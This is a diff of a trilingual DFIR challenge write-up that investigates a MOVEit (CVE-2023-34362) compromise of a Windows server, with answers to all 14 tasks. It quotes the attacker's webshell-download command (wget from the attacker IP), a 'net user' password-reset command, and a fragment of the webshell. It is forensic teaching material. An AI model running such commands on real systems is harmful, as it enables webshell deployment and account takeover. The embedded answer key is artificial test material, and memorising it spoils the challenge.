@@ -1,7 +1,7 @@
 # i-like-to [Easy]
 
-> **ES:** Ficha mínima — ver plantilla completa en `../../_PLANIFICACION/PLANTILLA_SHERLOCK.md`.
-> **EN:** Minimal header — see full template at `../../_PLANIFICACION/PLANTILLA_SHERLOCK.md`.
+> **ES:** Sherlock DFIR: servidor Windows con MOVEit vulnerable (CVE-2023-34362) — webshells ASPX/ASP, RDP, cambio de clave de servicio, 14 tasks.
+> **EN:** DFIR sherlock: Windows server with vulnerable MOVEit (CVE-2023-34362) — ASPX/ASP webshells, RDP, service password change, 14 tasks.
 
 | Campo | Valor |
 |-------|-------|
@@ -14,25 +14,29 @@
 
 We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here...
 
-不幸的是，我们一直躲在岩石下面，没有看到很多新闻文章提及最近在野外利用的 MOVEit CVE。我们认为我们的 Windows 服务器可能存在漏洞，并且最近遭受了此漏洞的攻击。我们需要更详细地了解此漏洞，并确认攻击者的行为并检索一些详细信息，以便我们可以将它们实施到我们的 SOC 环境中。我们为您提供了来自我们受损 Windows 服务器的所有必要工件的分诊。PS：其中一件工件是内存转储，但我们忘记包含 vmss 文件。您可能必须回到这里讨论基本知识...
+> [ZH] 不幸的是，我们一直躲在岩石下面……您可能必须回到这里讨论基本知识……
+> **ES:** Servidor Windows posiblemente comprometido vía MOVEit CVE en producción: confirmar acciones del atacante con triage completo (incluye volcado sin vmss → análisis básico).
+> **EN:** Windows server possibly compromised via in-the-wild MOVEit CVE: confirm attacker actions with full triage (includes vmss-less dump → basics).
 
 :::
 
-## 题目数据
+## 题目数据 / Datos / Data
 
-:::note
+> [ZH] 由于附件过大，故在此不提供下载链接。
+> **ES:** Anexo demasiado grande: sin enlace aquí (Triage.zip + vmem).
+> **EN:** Attachment too large: no link here (Triage.zip + vmem).
 
-由于附件过大，故在此不提供下载链接
+## First of all — CVE y adjunto / CVE and bundle
 
-:::
+> [ZH] 根据题目中所提到的 `MOVEit CVE` 信息，定位到 `CVE-2023-34362`
+> **ES:** El CVE de MOVEit en juego es el `CVE-2023-34362`.
+> **EN:** The MOVEit CVE at play is `CVE-2023-34362`.
 
-## First of all
+### 附件解压 / Descompresión / Extraction
 
-根据题目中所提到的 `MOVEit CVE` 信息，定位到 `CVE-2023-34362`
-
-### 附件解压
-
-首先，先将附件解压后，得到
+> [ZH] 首先，先将附件解压后，得到
+> **ES:** Descomprimir el adjunto (`I-like-to-*.vmem` + `Triage.zip`).
+> **EN:** Extract the bundle (`I-like-to-*.vmem` + `Triage.zip`).
 
 ```plaintext
 D:.
@@ -40,7 +44,8 @@ D:.
     Triage.zip
 ```
 
-将 `Triage.zip` 解压后，得到目录树（经过 URL Decode）
+> **ES:** Descomprimir `Triage.zip` (árbol con URL-decode, abajo).
+> **EN:** Extract `Triage.zip` (URL-decoded tree below).
 
 ```plaintext
 D:.
@@ -335,23 +340,25 @@ D:.
                     └─$TxfLog
 ```
 
-很明显为 Windows 的日志文件
+> **ES:** Claramente logs de Windows.
+> **EN:** Clearly Windows logs.
 
-### 内存镜像加载
+### 内存镜像加载 / Carga del volcado / Dump loading
 
-由于只有 `I-like-to-27a787c5.vmem` 文件，没有 `vmss` 文件，导致无法使用 `Volatility` 对内存镜像进行解析，但是仍然可以通过 `strings` 和 `R-Studio` 程序对内存镜像进行解析
+> **ES:** Solo hay `.vmem` (sin `vmss`): Volatility no aplica, pero sí `strings` y R-Studio.
+> **EN:** Only `.vmem` (no `vmss`): Volatility is out, `strings` and R-Studio still work.
 
 ![img](img/image_20240345-184551.png)
 
-### MFT 数据解析
+### MFT 数据解析 / Análisis MFT / MFT parsing
 
-使用 `MFTExplorer` 读取 `\iliketo\Triage\Triage\uploads\ntfs\%5C%5C.%5CC%3A\$MFT` 文件
+> **ES:** Leer el `$MFT` con MFTExplorer.
+> **EN:** Read the `$MFT` with MFTExplorer.
 
 ![img](img/image_20240336-223621.png)
 
-可以还原出来 NTFS 文件系统的结构数据
-
-同时，使用 `MFTECmd`+`TimelineExplorer` 进行时间线分析
+> **ES:** Así se reconstruye el NTFS; además, timeline con `MFTECmd` + TimelineExplorer.
+> **EN:** That rebuilds the NTFS; plus timeline with `MFTECmd` + TimelineExplorer.
 
 ```bash
 PS D:\_Tools\_ForensicAnalyzer\MFTECmd> .\MFTECmd.exe -f D:\Downloads\iliketo\Triage\Triage\uploads\ntfs\%5C%5C.%5CC%3A\$MFT --csv D:\Downloads\iliketo\Triage\Triage\uploads\ntfs\
@@ -373,19 +380,24 @@ Path to ./out.csv doesn't exist. Creating...
         CSV output will be saved to D:\Downloads\iliketo\Triage\Triage\uploads\ntfs\20240322151222_MFTECmd_$MFT_Output.csv
 ```
 
-对得到的 `20240322151222_MFTECmd_$MFT_Output.csv` 文件，使用 `TimelineExplorer` 进行加载
+> **ES:** Cargar el CSV del MFT en Timeline Explorer; logs HTTP en `\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log`.
+> **EN:** Load the MFT CSV in Timeline Explorer; HTTP logs at `\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log`.
 
 ![img](img/image_20240315-231518.png)
 
-### HTTP 日志
+### HTTP 日志 / Logs HTTP / HTTP logs
 
-HTTP 日志文件位于 `\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log`
+> **ES:** Los HTTP están en el path indicado.
+> **EN:** HTTP logs live at the path shown.
 
-## Task 1
+## Task 1 — Nombre del webshell ASPX / ASPX webshell name
 
-> 攻击者上传的 ASPX webshell 的名称是什么？
+> [ZH] 攻击者上传的 ASPX webshell 的名称是什么？
+> **ES:** ¿Cómo se llama el webshell ASPX subido por el atacante?
+> **EN:** What is the attacker's uploaded ASPX webshell called?
 
-在 `\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log` 中，对 HTTP 请求进行排查时，将所有请求的 User-Agent 提取出来
+> **ES:** En el log IIS, extraer los User-Agent únicos del día del ataque.
+> **EN:** In the IIS log, extract the day's unique User-Agents.
 
 ```python
 with open("./u_ex230712.log", "r") as f:
@@ -404,7 +416,8 @@ for i in logs:
 print("\n".join(user_agent))
 ```
 
-得到
+> **ES:** Salida:
+> **EN:** Output:
 
 ```plaintext
 Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)
@@ -415,11 +428,14 @@ CWinInetHTTPClient
 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/114.0.0.0+Safari/537.36
 ```
 
-在其中注意到 `Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)` 和 `Ruby` 两个 User-Agent 值，很明显为 `Nmap` 和 `Metasploit` 的 User-Agent
+> **ES:** Nmap y Metasploit delatan a los dos primeros; `CWinInetHTTPClient` es el tercero sospechoso.
+> **EN:** Nmap and Metasploit give away the first two; `CWinInetHTTPClient` is the third suspect.
 
-结合 Nmap 和 Metasploit 两款工具的特征，可以定位这两个 User-Agent 就是攻击源。并且还存在一个可疑的 User-Agent`CWinInetHTTPClient`
+> **ES:** Con la firma de ambas herramientas se fijan esos dos UA como origen, más el `CWinInetHTTPClient` sospechoso.
+> **EN:** Both tool signatures pin those two UAs as source, plus the suspect `CWinInetHTTPClient`.
 
-将这三个 User-Agnet 的请求进行提取
+> **ES:** Extraer las peticiones de esos tres UA.
+> **EN:** Extract those three UAs' requests.
 
 ```python
 with open("./u_ex230712.log", "r") as f:
@@ -442,7 +458,8 @@ for i in res:
     print(i)
 ```
 
-得到
+> **ES:** Se obtiene el listado (nmap + `Ruby`/Metasploit + `CWinInetHTTPClient`).
+> **EN:** Listing obtained (nmap + `Ruby`/Metasploit + `CWinInetHTTPClient`).
 
 ```plaintext
 ['/', 'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)']
@@ -468,18 +485,19 @@ for i in res:
 ['/api/v1/files/974247918', 'Ruby']
 ```
 
-结合 `CVE-2023-34362` 漏洞的利用信息，可以发现攻击流量 `['/machine2.aspx', 'CWinInetHTTPClient']`
+> **ES:** Por el exploit de `CVE-2023-34362`, el tráfico de ataque es el de `CWinInetHTTPClient`.
+> **EN:** Per the `CVE-2023-34362` exploit, the attack traffic is the `CWinInetHTTPClient` one.
 
-同时在后续的流量中，定位到以下记录
+> **ES:** Y en el tráfico posterior aparece el POST a `/move.aspx`.
+> **EN:** And later traffic shows the POST to `/move.aspx`.
 
 ```plaintext
 2023-07-12 11:24:43 10.10.0.25 GET /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 200 0 0 1179
 2023-07-12 11:24:47 10.10.0.25 POST /move.aspx - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 https://moveit.htb/move.aspx 200 0 0 159
 ```
 
-文件名很符合答案掩码，同时 aspx 符合 webshell 的部署常用格式，并且这个 filename 并非 `MOVEit` 服务的一部分
-
-在 `TimelineExplorer` 中查找这个文件
+> **ES:** `/move.aspx` encaja en la máscara (nombre + formato webshell) y no es parte de MOVEit: buscarlo en TimelineExplorer.
+> **EN:** `/move.aspx` fits the mask (name + webshell format) and is not MOVEit: find it in TimelineExplorer.
 
 ![img](img/image_20240316-231617.png)
 
@@ -487,11 +505,14 @@ for i in res:
 move.aspx
 ```
 
-## Task 2
+## Task 2 — IP del atacante / Attacker IP
 
-> 攻击者的 IP 地址是什么？
+> [ZH] 攻击者的 IP 地址是什么？
+> **ES:** ¿Cuál es la IP del atacante?
+> **EN:** What is the attacker's IP?
 
-上一题中 `move.aspx` 文件，在内存中进行查找
+> **ES:** Buscar `move.aspx` en memoria (`strings` del vmem).
+> **EN:** Hunt `move.aspx` in memory (`strings` on the vmem).
 
 ```bash
 Randark@DESKTOP-7HGIVVS MINGW64 /d/Downloads/iliketo
@@ -505,13 +526,10 @@ c:\moveittransfer\wwwroot\move.aspx
 ......
 ```
 
-对其中的特征点进一步筛选，并加上 `-A` 和 `-B` 参数查看上下 20 行的内容
-
-或者使用 `R-Studio` 进行分析
+> **ES:** Filtrar por rasgos y mirar ±20 líneas (o analizar con R-Studio) hasta dar con el contenido del `move.aspx` (webshell `awen asp.net`).
+> **EN:** Filter by features, check ±20 lines (or analyze with R-Studio) to the `move.aspx` content (`awen asp.net` webshell).
 
 ![img](img/image_20240328-232816.png)
-
-得到 `move.aspx` 文件的内容
 
 ```html
 <HTML>
@@ -536,21 +554,27 @@ c:\moveittransfer\wwwroot\move.aspx
 10.255.254.3
 ```
 
-## Task 3
+## Task 3 — User-Agent inicial / Initial User-Agent
 
-> 最初的攻击使用的是什么用户代理？
+> [ZH] 最初的攻击使用的是什么用户代理？
+> **ES:** ¿Qué User-Agent usó el ataque inicial?
+> **EN:** Which User-Agent did the initial attack use?
 
-上面就有
+> **ES:** Dato de arriba.
+> **EN:** From above.
 
 ```plaintext title="Answer"
 Ruby
 ```
 
-## Task 4
+## Task 4 — Hora de subida del webshell / Webshell upload time
 
-> 攻击者上传 ASPX webshell 的时间是什么时候？
+> [ZH] 攻击者上传 ASPX webshell 的时间是什么时候？
+> **ES:** ¿Cuándo subió el atacante el webshell ASPX?
+> **EN:** When did the attacker upload the ASPX webshell?
 
-在 `TimelineExplorer` 的结果中，筛选 `move.aspx` 文件的创建时间即可
+> **ES:** En TimelineExplorer, filtrar por creación de `move.aspx`.
+> **EN:** In TimelineExplorer, filter by `move.aspx` creation.
 
 ![img](img/image_20240334-233418.png)
 
@@ -558,15 +582,19 @@ Ruby
 12/07/2023 11:24:30
 ```
 
-## Task 5
+## Task 5 — Tamaño del ASP fallido / Failed ASP size
 
-> 攻击者上传了一个不起作用的 ASP webshell，它的文件大小是多少（以字节为单位）？
+> [ZH] 攻击者上传了一个不起作用的 ASP webshell，它的文件大小是多少（以字节为单位）？
+> **ES:** El atacante subió un webshell ASP que no funciona: ¿su tamaño en bytes?
+> **EN:** The attacker uploaded a non-working ASP webshell: its size in bytes?
 
-在 `TimelineExplorer` 中，筛选 `.\MOVEitTransfer\wwwroot` 路径下的记录
+> **ES:** En TimelineExplorer, registros bajo `.\MOVEitTransfer\wwwroot` → el `moveit.asp`.
+> **EN:** In TimelineExplorer, records under `.\MOVEitTransfer\wwwroot` → `moveit.asp`.
 
 ![img](img/image_20240345-234503.png)
 
-定位到这个文件 `moveit.asp`
+> **ES:** Ahí está el `moveit.asp`.
+> **EN:** There sits `moveit.asp`.
 
 ![img](img/image_20240303-000354.png)
 
@@ -574,27 +602,32 @@ Ruby
 1362
 ```
 
-## Task 6
+## Task 6 — Herramienta de enum inicial / Initial enum tool
 
-> 攻击者最初用来枚举易受攻击服务器的工具是什么？
+> [ZH] 攻击者最初用来枚举易受攻击服务器的工具是什么？
+> **ES:** ¿Qué herramienta usó el atacante para enumerar al inicio?
+> **EN:** Which tool did the attacker use for initial enumeration?
 
-在初步分析中的 User-Agent 中有
+> **ES:** Está en los User-Agent del análisis inicial.
+> **EN:** It's in the initial analysis User-Agents.
 
 ```plaintext title="Answer"
 nmap
 ```
 
-## Task 7
+## Task 7 — Cambio de clave moveitsvc (UTC) / moveitsvc password change (UTC)
 
-> 我们怀疑攻击者可能更改了我们服务帐户的密码。请确认发生此情况的时间（UTC）
+> [ZH] 我们怀疑攻击者可能更改了我们服务帐户的密码。请确认发生此情况的时间（UTC）
+> **ES:** Se sospecha cambio de clave de la cuenta de servicio: confirmar cuándo (UTC).
+> **EN:** Suspected service-account password change: confirm when (UTC).
 
-定位到 `User` 文件夹
+> **ES:** Ir a la carpeta `User`, identificar la cuenta de servicio `moveitsvc`.
+> **EN:** Go to the `User` folder, identify the `moveitsvc` service account.
 
 ![img](img/image_20240306-000605.png)
 
-可以定位到服务账户的名称 `moveitsvc`
-
-在内存中查找相关字符串，结合更改密码时常用 `net user` 指令，使用多关键词进行定位
+> **ES:** En memoria, buscar strings con varias keywords (`net user` es lo típico al cambiar claves).
+> **EN:** In memory, hunt strings with several keywords (`net user` is typical for password changes).
 
 ```bash
 ┌──(randark ㉿ kali)-[~]
@@ -621,11 +654,11 @@ C:\Users\moveitsvc.WIN-LR8T2EF8VHM.002\AppData\Roaming\Microsoft\Internet Explor
 net user "moveitsvc" 5trongP4ssw0rd
 ```
 
-可以定位到 `net user "moveitsvc" 5trongP4ssw0rd`
+> **ES:** Ahí sale el cambio (`net user "moveitsvc" ...`).
+> **EN:** There shows the change (`net user "moveitsvc" ...`).
 
-进而分析 `"\iliketo\Triage\Triage\uploads\auto\C%3A\Windows\System32\winevt\Logs\Security.evtx` 日志文件
-
-已知重置用户密码的事件 id 为 `4724`
+> **ES:** Cruzar con el `Security.evtx` (reset de password = evento 4724).
+> **EN:** Cross-check `Security.evtx` (password reset = event 4724).
 
 ![img](img/image_20240330-003021.png)
 
@@ -665,9 +698,11 @@ net user "moveitsvc" 5trongP4ssw0rd
 12/07/2023 11:09:27
 ```
 
-## Task 8
+## Task 8 — Protocolo de acceso remoto / Remote access protocol
 
-> 攻击者使用哪种协议远程进入受感染的计算机？
+> [ZH] 攻击者使用哪种协议远程进入受感染的计算机？
+> **ES:** ¿Con qué protocolo entró el atacante al equipo?
+> **EN:** Which protocol did the attacker use to reach the box?
 
 ![img](img/image_20240356-005635.png)
 
@@ -675,21 +710,27 @@ net user "moveitsvc" 5trongP4ssw0rd
 RDP
 ```
 
-## Task 9
+## Task 9 — Fecha del acceso remoto / Remote access time
 
-> 请确认攻击者远程访问受感染计算机的日期和时间？
+> [ZH] 请确认攻击者远程访问受感染计算机的日期和时间？
+> **ES:** Confirmar fecha y hora del acceso remoto.
+> **EN:** Confirm the remote access date and time.
 
-上一题中有
+> **ES:** Dato del task anterior.
+> **EN:** From the previous task.
 
 ```plaintext title="Answer"
 12/07/2023 11:11:18
 ```
 
-## Task 10
+## Task 10 — UA de acceso al webshell / Webshell access UA
 
-> 攻击者用于访问 webshell 的用户代理是什么?
+> [ZH] 攻击者用于访问 webshell 的用户代理是什么?
+> **ES:** ¿Qué User-Agent usó para acceder al webshell?
+> **EN:** Which User-Agent accessed the webshell?
 
-在 `\iliketo\Triage\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log` 中有
+> **ES:** Buscar en el mismo log IIS.
+> **EN:** Look in the same IIS log.
 
 ```plaintext
 2023-07-12 11:19:46 10.10.0.25 GET /moveit.asp - 443 - 10.255.254.3 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0 - 404 3 50 36
@@ -700,11 +741,14 @@ RDP
 Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0
 ```
 
-## Task 11
+## Task 11 — inst ID del atacante / Attacker inst ID
 
-> 攻击者的 inst ID 是什么？
+> [ZH] 攻击者的 inst ID 是什么？
+> **ES:** ¿Cuál es el inst ID del atacante?
+> **EN:** What is the attacker's inst ID?
 
-重建数据库，在数据库中即可查到
+> **ES:** Reconstruir la base y consultarlo.
+> **EN:** Rebuild the database and query it.
 
 ![img](img/image_20240359-005938.png)
 
@@ -712,11 +756,14 @@ Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0
 1234
 ```
 
-## Task 12
+## Task 12 — Comando de descarga del webshell / Webshell fetch command
 
-> 攻击者运行了什么命令来检索 webshell？
+> [ZH] 攻击者运行了什么命令来检索 webshell？
+> **ES:** ¿Qué comando corrió para traerse el webshell?
+> **EN:** Which command fetched the webshell?
 
-在 Powershell 的历史记录文件 `"\Triage\Triage\uploads\auto\C%3A\Users\moveitsvc.WIN-LR8T2EF8VHM.002\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` 中可以得到
+> **ES:** Leer el historial de PowerShell (`ConsoleHost_history.txt`).
+> **EN:** Read the PowerShell history (`ConsoleHost_history.txt`).
 
 ```plaintext
 cd C:\inetpub\wwwroot
@@ -732,21 +779,27 @@ wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
 wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx
 ```
 
-## Task 13
+## Task 13 — Título del webshell / Webshell title
 
->TA 部署的 webshell 的标题头中的字符串是什么？
+> [ZH] TA 部署的 webshell 的标题头中的字符串是什么？
+> **ES:** ¿Qué string lleva el título del webshell desplegado?
+> **EN:** Which string is in the deployed webshell's title?
 
-Task 2 中有
+> **ES:** Dato de Task 2.
+> **EN:** From Task 2.
 
 ```plaintext title="Answer"
 awen asp.net webshell
 ```
 
-## Task 14
+## Task 14 — Nueva clave moveitsvc / New moveitsvc password
 
->TA 将我们的 moveitsvc 帐户密码更改为什么？
+> [ZH] TA 将我们的 moveitsvc 帐户密码更改为什么？
+> **ES:** ¿A qué cambió la clave de moveitsvc?
+> **EN:** What did they change the moveitsvc password to?
 
-Task 7 中有
+> **ES:** Dato de Task 7.
+> **EN:** From Task 7.
 
 ```plaintext title="Answer"
 5trongP4ssw0rd
